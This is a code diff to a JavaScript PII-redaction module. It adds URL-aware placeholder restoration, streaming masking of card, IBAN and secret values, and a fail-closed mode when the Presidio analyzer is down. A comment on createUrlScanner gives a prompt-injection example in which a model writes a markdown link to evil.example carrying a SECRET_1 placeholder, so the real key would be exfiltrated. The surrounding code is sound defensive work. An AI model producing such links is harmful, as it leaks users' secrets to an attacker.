@@ -4,11 +4,11 @@
 // its own. Built-in recognizers always run; Presidio adds NER when configured. Nothing in this file
 // logs or transmits text: only counts and error codes are ever logged.
 
-const { detectBuiltin, resolveOverlaps, isCommonWord, isDateLike, escapeRegExp } = require("./patterns");
+const { AppError } = require("../util");
+const { detectBuiltin, resolveOverlaps, isCommonWord, isDateLike, escapeRegExp, HIGH_RISK_TYPES } = require("./patterns");
 const { createPresidioClient, PresidioError } = require("./presidio");
 
 const LABELS = Object.freeze(["PERSON", "EMAIL", "PHONE", "CARD", "IBAN", "SSN", "IP", "LOCATION", "PASSPORT", "LICENSE", "BANK_ACCOUNT", "CRYPTO", "SECRET"]);
-const HIGH_RISK_TYPES = Object.freeze(["CARD", "IBAN", "SSN", "BANK_ACCOUNT", "PASSPORT", "SECRET"]);
 const HIGH_RISK = new Set(HIGH_RISK_TYPES);
 
 // Media models cannot round-trip placeholders, so media prompts get a neutral phrase instead.
@@ -234,17 +234,102 @@ function applyGeneric(text, entities, seenByType, counts) {
   return out + text.slice(last);
 }
 
+/**
+ * Placeholders -> neutral phrases, for media prompts the classifier wrote from redacted text
+ * ("now make a video of [PERSON_1]" -> "now make a video of a person"). Media models cannot
+ * round-trip placeholders. Every placeholder form restore() would recognise is replaced, whether
+ * or not it is in a map: the first distinct one of a type gets the first phrase ("a person"),
+ * every further distinct one the second ("another person"), the same one always the same phrase.
+ */
+function genericizePlaceholders(text) {
+  if (typeof text !== "string") return text === null || text === undefined ? "" : String(text);
+  const seenByType = new Map();
+  return text.replace(placeholderRegex(), (match, rawType, num) => {
+    const type = canonicalType(rawType);
+    const key = placeholderKey(rawType, num);
+    if (!seenByType.has(type)) seenByType.set(type, new Map());
+    const seen = seenByType.get(type);
+    const phrases = GENERIC_PHRASES[type] || GENERIC_FALLBACK;
+    if (!seen.has(key)) seen.set(key, seen.size === 0 ? phrases[0] : phrases[1]);
+    return seen.get(key);
+  });
+}
+
 // ---------------------------------------------------------------------------------------------
 // Restore
 // ---------------------------------------------------------------------------------------------
 
-/** Replace placeholders that exist in `byPlaceholder`; matches starting before `from` are context only. */
-function restoreText(text, byPlaceholder, from = 0) {
-  return text.replace(placeholderRegex(), (match, type, num, offset) => {
-    if (offset < from) return match;
-    const key = placeholderKey(type, num);
-    return Object.hasOwn(byPlaceholder, key) ? byPlaceholder[key] : match;
-  });
+const URL_END = /[\s"'`>]/;
+
+/**
+ * Tracks whether the text read so far ends inside a URL, character by character, so restore() and
+ * the stream restorer decide the same way whatever the chunk boundaries. Placeholders inside a URL
+ * are never restored: a model following injected instructions could otherwise write
+ * "[Open the dashboard](https://evil.example/?k=[SECRET_1])" and Gode would fill in the real key
+ * behind a link the user may click. URL contexts, generous on purpose (not restoring is the safe
+ * side): a bare http(s):// run, a markdown link target after "](", an autolink "<scheme:...>".
+ * Whitespace and < > " ' ` end every context; ")" also ends a link target.
+ */
+function createUrlScanner() {
+  let recent = ""; // the current run's last characters, enough to spot an opener
+  let bare = false;
+  let target = false;
+  let auto = false;
+  return {
+    advance(s) {
+      for (let i = 0; i < s.length; i++) {
+        const ch = s[i];
+        if (URL_END.test(ch)) {
+          bare = target = auto = false;
+          recent = "";
+          continue;
+        }
+        if (ch === "<") {
+          bare = target = auto = false;
+          recent = "<";
+          continue;
+        }
+        if (ch === ")") target = false;
+        recent = recent.length >= 40 ? recent.slice(-39) + ch : recent + ch;
+        if (ch === "/" && !bare && /https?:\/\/$/i.test(recent)) bare = true;
+        else if (ch === "(" && recent.endsWith("](")) target = true;
+        else if (ch === ":" && !auto && /^<[A-Za-z][A-Za-z0-9+.-]{1,31}:$/.test(recent)) auto = true;
+      }
+    },
+    get inUrl() {
+      return bare || target || auto;
+    },
+  };
+}
+
+/**
+ * Replace placeholders that exist in `byPlaceholder`, except inside URLs (createUrlScanner).
+ * Returns the restored text from `from` on: text before `from` is context only (the regex's word
+ * boundary), already fed to `scanner`; a match starting there is left as it is.
+ */
+function restoreText(text, byPlaceholder, { from = 0, scanner = createUrlScanner() } = {}) {
+  let out = "";
+  let pos = from;
+  for (const m of text.matchAll(placeholderRegex())) {
+    const start = m.index;
+    const end = start + m[0].length;
+    if (end <= from) continue;
+    if (start < from) {
+      scanner.advance(text.slice(pos, end));
+      out += text.slice(pos, end);
+      pos = end;
+      continue;
+    }
+    const before = text.slice(pos, start);
+    scanner.advance(before);
+    const key = placeholderKey(m[1], m[2]);
+    out += before + (Object.hasOwn(byPlaceholder, key) && !scanner.inUrl ? byPlaceholder[key] : m[0]);
+    scanner.advance(m[0]);
+    pos = end;
+  }
+  const rest = text.slice(pos);
+  scanner.advance(rest);
+  return out + rest;
 }
 
 function placeholdersOf(map) {
@@ -254,7 +339,10 @@ function placeholdersOf(map) {
   return out;
 }
 
-/** Placeholders → real values. Unknown placeholders and everything else stay as they are. */
+/**
+ * Placeholders → real values. Unknown placeholders, placeholders inside URLs (link targets,
+ * autolinks, bare http(s) URLs) and everything else stay as they are.
+ */
 function restore(text, map) {
   if (typeof text !== "string") return text === null || text === undefined ? "" : String(text);
   const byPlaceholder = placeholdersOf(map);
@@ -292,9 +380,28 @@ function couldBePlaceholder(s, prev, bodies) {
 /**
  * Streaming restore. push() returns only text that can no longer be part of a placeholder; the
  * shortest tail that still could ("[", "[PER", "PERSON_1") is held until the next chunk or flush().
- * Concatenated output always equals restore(fullText, map), whatever the chunk boundaries.
+ * Concatenated output always equals restore(fullText, map), whatever the chunk boundaries
+ * (placeholders inside URLs included: the URL scanner sees the same characters in the same order).
+ *
+ * opts.maskHighRisk: also mask high-risk data the model produced on its own while streaming (see
+ * createHighRiskMasker), so a regurgitated card number is never on screen even for a moment.
+ * opts.ownMap: the map whose values are the user's own (never masked); defaults to `map`. Pass it
+ * when `map` is null because the model got the real text (self-hosted): the user's own values are
+ * still theirs.
  */
-function createStreamRestorer(map) {
+function createStreamRestorer(map, { maskHighRisk = false, ownMap = map } = {}) {
+  const restorer = createPlainStreamRestorer(map);
+  if (!maskHighRisk) return restorer;
+  const masker = createHighRiskMasker(ownMap);
+  return {
+    push: (chunk) => masker.push(restorer.push(chunk)),
+    flush: () => masker.push(restorer.flush()) + masker.flush(),
+    /** { [type]: n } masked so far. */
+    masked: () => masker.masked(),
+  };
+}
+
+function createPlainStreamRestorer(map) {
   const byPlaceholder = placeholdersOf(map);
   const bodies = Object.keys(byPlaceholder).map((k) => k.slice(1, -1));
   if (!bodies.length) {
@@ -304,6 +411,7 @@ function createStreamRestorer(map) {
   const maxHold = Math.max(...bodies.map((b) => b.length + (b.match(/_/g) || []).length)) + 4;
   let pending = "";
   let prev = ""; // last raw character already emitted: context for word boundaries
+  const scanner = createUrlScanner(); // has seen every raw character emitted so far
 
   function holdStart(buf) {
     for (let i = Math.max(0, buf.length - maxHold); i < buf.length; i++) {
@@ -314,7 +422,7 @@ function createStreamRestorer(map) {
 
   function emit(segment) {
     if (!segment) return "";
-    const out = prev ? restoreText(prev + segment, byPlaceholder, prev.length).slice(prev.length) : restoreText(segment, byPlaceholder);
+    const out = restoreText(prev + segment, byPlaceholder, { from: prev.length, scanner });
     prev = segment[segment.length - 1];
     return out;
   }
@@ -333,6 +441,83 @@ function createStreamRestorer(map) {
       pending = "";
       return emit(segment);
     },
+  };
+}
+
+// Incremental high-risk masking (createHighRiskMasker). The detectors need the whole value and a
+// little context before it, so the masker holds back the trailing word (a key, a password after
+// "password:") and, before it, any run of short digit groups a card/IBAN/SSN could still grow from
+// ("4111 1111 "). Released text is checked together with the last MASK_LOOKBACK characters already
+// shown (keywords like "SSN" or "password:" live there).
+const MASK_LOOKBACK = 96;
+const MASK_MAX_GROUP_RUN = 64; // longest spaced number kept back: an IBAN is 34 chars + 8 spaces
+const MASK_MAX_HOLD = 4096; // a single "word" longer than this is released anyway (final filter)
+// A word a spaced card/IBAN/SSN may consist of: short with a digit, or an IBAN's letter group ("NWBK").
+const GROUP_WORD = /^(?:(?=[A-Za-z0-9-]*\d)[A-Za-z0-9-]{1,8}|[A-Z]{4})$/;
+
+/**
+ * Masks high-risk values that are not the user's own in a stream of (restored) text, like
+ * filterResponse does on the final text, without ever showing them first. What it cannot see whole
+ * (a multi-line private key block, a token over MASK_MAX_HOLD) passes through for the final
+ * filterResponse to replace, so the final filter stays the safety net.
+ */
+function createHighRiskMasker(ownMap) {
+  const isOwn = ownValueIndex(ownMap);
+  const masked = {};
+  let held = "";
+  let lookback = "";
+
+  /** Index in `buf` before which text can be released. */
+  function cutPoint(buf) {
+    const lastWs = (s, before) => {
+      for (let i = before - 1; i >= 0; i--) if (/\s/.test(s[i])) return i;
+      return -1;
+    };
+    // The trailing word may still grow, unless whitespace already ended it.
+    const tail = /\s$/.test(buf) ? buf.length : lastWs(buf, buf.length) + 1;
+    // Digit groups right before it, one space apart, may be the start of a spaced number.
+    let start = tail;
+    while (start >= 2 && buf[start - 1] === " ") {
+      const wordStart = lastWs(buf, start - 1) + 1;
+      if (!GROUP_WORD.test(buf.slice(wordStart, start - 1)) || tail - wordStart > MASK_MAX_GROUP_RUN) break;
+      start = wordStart;
+    }
+    return Math.max(start, buf.length - MASK_MAX_HOLD);
+  }
+
+  function release(segment) {
+    if (!segment) return "";
+    const ctx = lookback + segment;
+    let out = "";
+    let last = lookback.length;
+    // Only values wholly inside the new text: one that began in text already shown is left for the
+    // final filter, which masks it whole.
+    for (const e of highRiskHits(ctx, isOwn)) {
+      if (e.start < lookback.length) continue;
+      out += `${ctx.slice(last, e.start)}[redacted ${e.type}]`;
+      last = e.end;
+      masked[e.type] = (masked[e.type] || 0) + 1;
+    }
+    out += ctx.slice(last);
+    lookback = (lookback + out).slice(-MASK_LOOKBACK);
+    return out;
+  }
+
+  return {
+    push(text) {
+      if (!text) return "";
+      held += text;
+      const cut = cutPoint(held);
+      const segment = held.slice(0, cut);
+      held = held.slice(cut);
+      return release(segment);
+    },
+    flush() {
+      const segment = held;
+      held = "";
+      return release(segment);
+    },
+    masked: () => ({ ...masked }),
   };
 }
 
@@ -374,11 +559,15 @@ function isPublicExample(type, value) {
   return false;
 }
 
+/** High-risk entities in `text` that are neither the user's own nor public examples. */
+function highRiskHits(text, isOwn) {
+  return detectBuiltin(text).filter((e) => HIGH_RISK.has(e.type) && !isOwn(e.type, e.value) && !isPublicExample(e.type, e.value));
+}
+
 function filterResponse(text, map) {
   const masked = {};
   if (typeof text !== "string" || !text) return { text: typeof text === "string" ? text : "", masked };
-  const isOwn = ownValueIndex(map);
-  const hits = detectBuiltin(text).filter((e) => HIGH_RISK.has(e.type) && !isOwn(e.type, e.value) && !isPublicExample(e.type, e.value));
+  const hits = highRiskHits(text, ownValueIndex(map));
   if (!hits.length) return { text, masked };
   let out = "";
   let last = 0;
@@ -407,10 +596,17 @@ const ANALYZE_CONCURRENCY = 4;
 async function mapLimit(items, limit, fn) {
   const out = new Array(items.length);
   let next = 0;
+  let failed = false;
   const worker = async () => {
-    while (next < items.length) {
+    // After one failure the call is lost anyway: stop starting new work (and new Presidio calls).
+    while (next < items.length && !failed) {
       const i = next++;
-      out[i] = await fn(items[i], i);
+      try {
+        out[i] = await fn(items[i], i);
+      } catch (err) {
+        failed = true;
+        throw err;
+      }
     }
   };
   await Promise.all(Array.from({ length: Math.min(limit, items.length) }, worker));
@@ -428,15 +624,29 @@ function plausibleExternal(e) {
   return true;
 }
 
+const UNAVAILABLE_MESSAGE = "The privacy filter is unavailable right now, so nothing was sent. Try again in a minute.";
+
+/** The error redactMessages rejects with while Presidio is required (fail mode 'closed') and down. */
+function redactionUnavailable() {
+  return new AppError(503, "redaction_unavailable", UNAVAILABLE_MESSAGE);
+}
+
 /**
  * @param {object} config full app config (uses config.privacy)
- * @param {object} [opts] { fetch, logger, presidioRetryMs } — injectable for tests
+ * @param {object} [opts] { fetch, logger, presidioRetryMs, presidioTimeoutMs, presidioRemindMs } — injectable for tests
  */
 function createRedactor(config, opts = {}) {
   const privacy = (config && config.privacy) || {};
   const logger = opts.logger || console;
-  // While Presidio is failing, skip it for a while instead of adding a timeout to every request.
-  const retryMs = Number.isFinite(opts.presidioRetryMs) ? opts.presidioRetryMs : 30_000;
+  // config.privacy.presidioFailMode (PRESIDIO_FAIL_MODE): with a Presidio URL set, 'closed' (the
+  // default, also for hand-built configs) refuses to redact without it; 'open' carries on with the
+  // built-in recognizers.
+  const failClosed = privacy.presidioFailMode !== "open";
+  // While Presidio is failing, skip it for a while instead of adding a timeout to every request
+  // (a circuit breaker). Fail-closed refuses every prompt meanwhile, so it probes again sooner.
+  const retryMs = Number.isFinite(opts.presidioRetryMs) ? opts.presidioRetryMs : failClosed ? 10_000 : 30_000;
+  // An outage is logged when it starts, again every presidioRemindMs while it lasts, and at the end.
+  const remindMs = Number.isFinite(opts.presidioRemindMs) ? opts.presidioRemindMs : 5 * 60_000;
   const presidio = privacy.presidioUrl
     ? createPresidioClient({
         url: privacy.presidioUrl,
@@ -449,28 +659,51 @@ function createRedactor(config, opts = {}) {
       })
     : null;
 
-  let presidioDown = false;
+  // 'off' (no URL) | 'unknown' (not used yet) | 'up' | 'down'
+  let state = presidio ? "unknown" : "off";
+  let downSince = 0;
   let retryAt = 0;
+  let lastReminder = 0;
+  let skipped = 0; // analyses done without Presidio (open) or refused (closed) in this outage
+  const what = failClosed ? "refused" : "redacted with built-in recognizers only";
+
+  /** Presidio unusable for this text: refuse (closed) or carry on with the built-ins (open). */
+  function withoutPresidio() {
+    skipped += 1;
+    const now = Date.now();
+    if (now - lastReminder >= remindMs) {
+      lastReminder = now;
+      const minutes = Math.max(1, Math.round((now - downSince) / 60_000));
+      logger.warn?.(`[redact] Presidio analyzer still unavailable after ${minutes} min; ${skipped} texts ${what} so far`);
+    }
+    if (failClosed) throw redactionUnavailable();
+    return [];
+  }
 
   async function presidioEntities(text) {
     if (!presidio || !text.trim()) return [];
-    if (presidioDown && Date.now() < retryAt) return [];
+    if (state === "down" && Date.now() < retryAt) return withoutPresidio();
     try {
       const found = await presidio.analyze(text);
-      if (presidioDown) {
-        presidioDown = false;
-        logger.info?.("[redact] Presidio analyzer reachable again");
+      if (state === "down") {
+        const seconds = Math.round((Date.now() - downSince) / 1000);
+        logger.info?.(`[redact] Presidio analyzer reachable again after ${seconds} s; ${skipped} texts ${what} meanwhile`);
       }
+      state = "up";
       return found.filter(plausibleExternal);
     } catch (err) {
-      if (!presidioDown) {
+      if (state !== "down") {
         // err.message of a PresidioError is built by us and never contains text.
         const why = err instanceof PresidioError ? err.message : err?.name || "error";
-        logger.warn?.(`[redact] Presidio analyzer unavailable (${why}); using built-in recognizers only`);
+        const then = failClosed ? "refusing prompts until it is back (PRESIDIO_FAIL_MODE=closed)" : "using built-in recognizers only";
+        logger.warn?.(`[redact] Presidio analyzer unavailable (${why}); ${then}`);
+        state = "down";
+        downSince = Date.now();
+        lastReminder = downSince;
+        skipped = 0;
       }
-      presidioDown = true;
       retryAt = Date.now() + retryMs;
-      return [];
+      return withoutPresidio();
     }
   }
 
@@ -519,10 +752,30 @@ function createRedactor(config, opts = {}) {
     createStreamRestorer,
     filterResponse,
     isSensitive,
-    /** Whether a Presidio URL is configured (not whether it is up). */
+    genericizePlaceholders,
+    /** Whether a Presidio URL is configured (not whether it is up): see presidioStatus(). */
     presidioEnabled: Boolean(presidio),
-    /** Live check of the configured analyzer; false when none is configured. */
-    presidioHealth: () => (presidio ? presidio.health() : Promise.resolve(false)),
+    /**
+     * Live check of the configured analyzer; false when none is configured. A healthy answer during
+     * an outage lets the next prompt try Presidio again at once instead of waiting out the breaker.
+     */
+    presidioHealth: async () => {
+      if (!presidio) return false;
+      const ok = await presidio.health();
+      if (ok && state === "down") retryAt = 0;
+      return ok;
+    },
+    /**
+     * What redaction can promise right now, without a network call (for status pages and the
+     * privacy page: say "Presidio" only while state is 'up').
+     * @returns {{ enabled: boolean, state: 'off'|'unknown'|'up'|'down', failMode: 'closed'|'open', downSince: number|null }}
+     */
+    presidioStatus: () => ({
+      enabled: Boolean(presidio),
+      state,
+      failMode: failClosed ? "closed" : "open",
+      downSince: state === "down" ? downSince : null,
+    }),
   };
 }
 
@@ -532,6 +785,7 @@ module.exports = {
   createStreamRestorer,
   filterResponse,
   isSensitive,
+  genericizePlaceholders,
   normalizeValue,
   emptyMap,
   cloneMap,
